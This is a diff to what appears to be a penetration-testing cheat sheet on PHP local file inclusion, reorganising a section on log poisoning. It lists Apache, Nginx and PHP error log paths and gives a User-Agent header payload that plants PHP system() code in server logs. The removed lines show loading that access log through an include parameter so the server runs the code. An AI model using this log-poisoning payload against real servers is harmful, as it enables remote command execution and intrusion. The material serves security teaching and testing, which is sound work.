@@ -27,6 +27,34 @@ http://example.com/index.php?page=about.php
 ```
 The application includes and executes `pages/about.php`. However, an attacker can manipulate this behavior to load arbitrary files.
 
+#### Log Poisoning
+
+1. **Access the log file:**
+
+Apache:
+```bash
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+```
+Nginx:
+```bash
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+```
+Custom or PHP errors:
+```bash
+/var/log/php_errors.log
+```
+
+2. **Inject payload into logs**
+
+Make a request to the target with the following header:
+```bash
+User-Agent: <?php system('id'); ?>
+```
+This header is usually logged in `/var/log/apache2/access.log` or `/var/log/httpd/access_log`.
+
+
 #### Forcing PHP File Inclusion Without Execution
 
 By default, including a `.php` file causes the server to execute it rather than display its source code. However, certain methods can bypass execution.
@@ -48,16 +76,3 @@ echo "<base64_content>" | base64 -d
 - `index.php.save`
 - `.index.php.swp` 
 
-#### Log Poisoning
-
-Inject malicious PHP code into server logs and include the log file.
-
-1. Send a request with malicious input in a header (e.g., `User-Agent`):
-```bash
-User-Agent: <?php system('id'); ?>
-```
-
-2. Access the log file:
-```bash
-http://example.com/index.php?page=/var/log/apache2/access.log
-```
